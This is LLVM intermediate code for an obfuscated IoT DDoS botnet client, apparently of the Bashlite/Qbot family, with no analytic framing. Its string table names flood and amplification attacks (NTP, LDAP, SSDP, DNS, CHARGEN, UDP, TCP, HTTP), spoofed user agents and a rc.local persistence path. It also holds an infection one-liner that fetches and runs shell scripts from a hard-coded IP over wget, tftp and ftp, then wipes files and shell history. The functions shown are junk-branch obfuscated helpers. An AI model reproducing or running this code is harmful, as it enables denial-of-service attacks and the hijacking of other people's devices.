@.str.488 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
@.str.489 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.490 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.491 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.492 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.493 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.494 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.495 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.496 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.497 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.502 = private unnamed_addr constant [8 x i8] c"CHARGEN\00", align 1
@.str.503 = private unnamed_addr constant [40 x i8] c"cd; ./chargen %s %s chargen.txt 2 -1 %s\00", align 1
@.str.504 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.505 = private unnamed_addr constant [34 x i8] c"cd; ./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.506 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.507 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.508 = private unnamed_addr constant [4 x i8] c"NTP\00", align 1
@.str.509 = private unnamed_addr constant [29 x i8] c"cd; ./ntp %s %s ntp.txt 2 %s\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"SSDP\00", align 1
@.str.511 = private unnamed_addr constant [34 x i8] c"cd; ./ssdp %s %s ssdp.txt 2 -1 %s\00", align 1
@.str.512 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.513 = private unnamed_addr constant [32 x i8] c"cd; ./dns %s %s dns.txt 2 -1 %s\00", align 1
@.str.514 = private unnamed_addr constant [4 x i8] c"TS3\00", align 1
@.str.515 = private unnamed_addr constant [44 x i8] c"cd; cd supreme; ./ts3 %s %s ts3.txt 2 -1 %s\00", align 1
@.str.516 = private unnamed_addr constant [439 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://46.101.35.30/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 46.101.35.30 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 46.101.35.30; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.101.35.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00", align 1
@.str.517 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.518 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.519 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.520 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.521 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"HUMANS SHUTTING DOWN\00", align 1
@.str.523 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.524 = private unnamed_addr constant [47 x i8] c"\1B[0;36mHUMANS SEARCHING ON | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.525 = private unnamed_addr constant [23 x i8] c"IMAASSHOLETHATBOTKILLS\00", align 1
@.str.526 = private unnamed_addr constant [24 x i8] c"HUMANS KILLING | IP: %s\00", align 1
@.str.527 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.528 = private unnamed_addr constant [4 x i8] c"AMP\00", align 1
@.str.529 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.530 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.531 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.532 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.533 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.534 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.535 = private unnamed_addr constant [13 x i8] c"DDOS STOPPED\00", align 1
@.str.536 = private unnamed_addr constant [16 x i8] c"NO DDOS STOPPED\00", align 1
@.str.537 = private unnamed_addr constant [7 x i8] c"HAHANO\00", align 1
@.str.538 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.539 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.540 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.541 = private unnamed_addr constant [6 x i8] c"HUMAN\00", align 1
@.str.542 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.543 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.544 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.545 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.546 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.547 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.548 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.549 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.550 = private unnamed_addr constant [44 x i8] c"\1B[0;36mNEW %s CONNECTED | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.551 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.552 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.553 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.554 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.555 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.556 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.557 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0
@x.89 = common global i32 0
@y.90 = common global i32 0
@x.91 = common global i32 0
@y.92 = common global i32 0
@x.93 = common global i32 0
@y.94 = common global i32 0
@x.95 = common global i32 0
@y.96 = common global i32 0
@x.97 = common global i32 0
@y.98 = common global i32 0
@x.99 = common global i32 0
@y.100 = common global i32 0
@x.101 = common global i32 0
@y.102 = common global i32 0
@x.103 = common global i32 0
@y.104 = common global i32 0
@x.105 = common global i32 0
@y.106 = common global i32 0
@x.107 = common global i32 0
@y.108 = common global i32 0
@x.109 = common global i32 0
@y.110 = common global i32 0
@x.111 = common global i32 0
@y.112 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x
  %3 = load i32, i32* @y
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x
  %19 = load i32, i32* @y
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart229, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %66

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* %11, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %11, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %11, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %11, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* @x
  %49 = load i32, i32* @y
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %47
  %56 = load i32, i32* %11, align 4
  %57 = add nsw i32 %56, 1
  store i32 %57, i32* %11, align 4
  %58 = load i32, i32* @x
  %59 = load i32, i32* @y
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart229, label %originalBB23alteredBB

originalBBpart229:                                ; preds = %originalBB23
  br label %26

; <label>:66:                                     ; preds = %26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %67 = alloca i32, align 4
  %68 = alloca i32, align 4
  store i32 %0, i32* %67, align 4
  %69 = load i32, i32* %67, align 4
  store i32 %69, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %70 = load i32, i32* %67, align 4
  %_ = shl i32 %70, -1640531527
  %_1 = shl i32 %70, -1640531527
  %_2 = sub i32 %70, -1640531527
  %gen = mul i32 %_2, -1640531527
  %_3 = sub i32 %70, -1640531527
  %gen4 = mul i32 %_3, -1640531527
  %71 = add i32 %70, -1640531527
  store i32 %71, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %72 = load i32, i32* %67, align 4
  %_5 = sub i32 0, %72
  %gen6 = add i32 %_5, -1640531527
  %_7 = shl i32 %72, -1640531527
  %_8 = shl i32 %72, -1640531527
  %_9 = sub i32 %72, -1640531527
  %gen10 = mul i32 %_9, -1640531527
  %_11 = sub i32 %72, -1640531527
  %gen12 = mul i32 %_11, -1640531527
  %_13 = sub i32 %72, -1640531527
  %gen14 = mul i32 %_13, -1640531527
  %_15 = shl i32 %72, -1640531527
  %73 = add i32 %72, -1640531527
  %_16 = sub i32 0, %73
  %gen17 = add i32 %_16, -1640531527
  %_18 = shl i32 %73, -1640531527
  %_19 = sub i32 0, %73
  %gen20 = add i32 %_19, -1640531527
  %_21 = sub i32 %73, -1640531527
  %gen22 = mul i32 %_21, -1640531527
  %74 = add i32 %73, -1640531527
  store i32 %74, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %68, align 4
  br label %originalBB

originalBB23alteredBB:                            ; preds = %originalBB23, %47
  %75 = load i32, i32* %11, align 4
  %_24 = shl i32 %75, 1
  %_25 = sub i32 0, %75
  %gen26 = add i32 %_25, 1
  %_27 = shl i32 %75, 1
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %11, align 4
  br label %originalBB23
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

; <label>:29:                                     ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

; <label>:34:                                     ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %originalBBpart2, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %38

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @x.3
  %21 = load i32, i32* @y.4
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %19
  %28 = load i32, i32* %4, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* @x.3
  %31 = load i32, i32* @y.4
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %10

; <label>:38:                                     ; preds = %10
  br label %39

; <label>:39:                                     ; preds = %70, %38
  %40 = load i32, i32* @x.3
  %41 = load i32, i32* @y.4
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %39
  %48 = load i32, i32* %5, align 4
  %49 = load i32, i32* %4, align 4
  %50 = icmp sge i32 %48, %49
  %51 = load i32, i32* @x.3
  %52 = load i32, i32* @y.4
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br i1 %50, label %59, label %68

; <label>:59:                                     ; preds = %originalBBpart213
  %60 = load i8*, i8** %2, align 8
  %61 = load i32, i32* %5, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds i8, i8* %60, i64 %62
  %64 = load i8, i8* %63, align 1
  %65 = sext i8 %64 to i32
  %66 = call i32 @isspace(i32 %65) #10
  %67 = icmp ne i32 %66, 0
  br label %68

; <label>:68:                                     ; preds = %59, %originalBBpart213
  %69 = phi i1 [ false, %originalBBpart213 ], [ %67, %59 ]
  br i1 %69, label %70, label %73

; <label>:70:                                     ; preds = %68
  %71 = load i32, i32* %5, align 4
  %72 = add nsw i32 %71, -1
  store i32 %72, i32* %5, align 4
  br label %39

; <label>:73:                                     ; preds = %68
  %74 = load i32, i32* %4, align 4
  store i32 %74, i32* %3, align 4
  br label %75

; <label>:75:                                     ; preds = %107, %73
  %76 = load i32, i32* @x.3
  %77 = load i32, i32* @y.4
  %78 = sub i32 %76, 1
  %79 = mul i32 %76, %78
  %80 = urem i32 %79, 2
  %81 = icmp eq i32 %80, 0
  %82 = icmp slt i32 %77, 10
  %83 = or i1 %81, %82
  br i1 %83, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %75
  %84 = load i32, i32* %3, align 4
  %85 = load i32, i32* %5, align 4
  %86 = icmp sle i32 %84, %85
  %87 = load i32, i32* @x.3
  %88 = load i32, i32* @y.4
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br i1 %86, label %95, label %110

; <label>:95:                                     ; preds = %originalBBpart217
  %96 = load i8*, i8** %2, align 8
  %97 = load i32, i32* %3, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8, i8* %96, i64 %98
  %100 = load i8, i8* %99, align 1
  %101 = load i8*, i8** %2, align 8
  %102 = load i32, i32* %3, align 4
  %103 = load i32, i32* %4, align 4
  %104 = sub nsw i32 %102, %103
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8, i8* %101, i64 %105
  store i8 %100, i8* %106, align 1
  br label %107

; <label>:107:                                    ; preds = %95
  %108 = load i32, i32* %3, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %3, align 4
  br label %75

; <label>:110:                                    ; preds = %originalBBpart217
  %111 = load i8*, i8** %2, align 8
  %112 = load i32, i32* %3, align 4
  %113 = load i32, i32* %4, align 4
  %114 = sub nsw i32 %112, %113
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %111, i64 %115
  store i8 0, i8* %116, align 1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %19
  %117 = load i32, i32* %4, align 4
  %_ = sub i32 0, %117
  %gen = add i32 %_, 1
  %_1 = shl i32 %117, 1
  %_2 = sub i32 0, %117
  %gen3 = add i32 %_2, 1
  %_4 = shl i32 %117, 1
  %_5 = sub i32 %117, 1
  %gen6 = mul i32 %_5, 1
  %_7 = sub i32 %117, 1
  %gen8 = mul i32 %_7, 1
  %_9 = sub i32 0, %117
  %gen10 = add i32 %_9, 1
  %118 = add nsw i32 %117, 1
  store i32 %118, i32* %4, align 4
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %39
  %119 = load i32, i32* %5, align 4
  %120 = load i32, i32* %4, align 4
  %121 = icmp sge i32 %119, %120
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %75
  %122 = load i32, i32* %3, align 4
  %123 = load i32, i32* %5, align 4
  %124 = icmp sle i32 %122, %123
  br label %originalBB15
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %603, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %606

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %578

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %46

; <label>:29:                                     ; preds = %22
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %29
  %38 = load i32, i32* @x.7
  %39 = load i32, i32* @y.8
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %606

; <label>:46:                                     ; preds = %22
  %47 = load i8*, i8** %5, align 8
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 37
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %595

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 45
  br i1 %56, label %57, label %60

; <label>:57:                                     ; preds = %52
  %58 = load i8*, i8** %5, align 8
  %59 = getelementptr inbounds i8, i8* %58, i32 1
  store i8* %59, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %60

; <label>:60:                                     ; preds = %57, %52
  br label %61

; <label>:61:                                     ; preds = %82, %60
  %62 = load i32, i32* @x.7
  %63 = load i32, i32* @y.8
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %61
  %70 = load i8*, i8** %5, align 8
  %71 = load i8, i8* %70, align 1
  %72 = zext i8 %71 to i32
  %73 = icmp eq i32 %72, 48
  %74 = load i32, i32* @x.7
  %75 = load i32, i32* @y.8
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %73, label %82, label %87

; <label>:82:                                     ; preds = %originalBBpart24
  %83 = load i8*, i8** %5, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %5, align 8
  %85 = load i32, i32* %8, align 4
  %86 = or i32 %85, 2
  store i32 %86, i32* %8, align 4
  br label %61

; <label>:87:                                     ; preds = %originalBBpart24
  br label %88

; <label>:88:                                     ; preds = %originalBBpart212, %87
  %89 = load i8*, i8** %5, align 8
  %90 = load i8, i8* %89, align 1
  %91 = zext i8 %90 to i32
  %92 = icmp sge i32 %91, 48
  br i1 %92, label %93, label %114

; <label>:93:                                     ; preds = %88
  %94 = load i32, i32* @x.7
  %95 = load i32, i32* @y.8
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
